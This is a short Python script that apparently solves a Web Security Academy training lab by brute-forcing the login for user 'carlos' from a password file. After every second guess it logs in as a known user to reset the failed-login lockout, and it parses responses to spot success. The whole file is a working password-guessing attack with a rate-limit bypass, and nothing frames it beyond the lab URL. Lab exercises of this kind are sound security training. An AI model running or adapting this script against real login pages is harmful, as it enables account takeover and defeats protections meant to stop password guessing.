import requests

def parse_response(response):
    if response.status_code == 302:
        print("found it")

    if "You have made too many" in response.text:
        print("we are fucked")

    if "Incorrect password" in response.text:
        print("we are good to go")

url = "https://ac651f911fe8e6dc80a72344007e009c.web-security-academy.net/login"
# response = requests.post(url, data=f"username=wiener&password=peter1", allow_redirects=False)
# parse_response(response)




with open("../passwords.txt") as file:
    passwords = [password.strip() for password in file]


for i, password in enumerate(passwords):
    print("try:", password)
    response = requests.post(url, data=f"username=carlos&password={password}", allow_redirects=False)
    parse_response(response)

    if i % 2 == 0:
        response = requests.post(url, data=f"username=wiener&password=peter", allow_redirects=False)
        print("legit request is sent")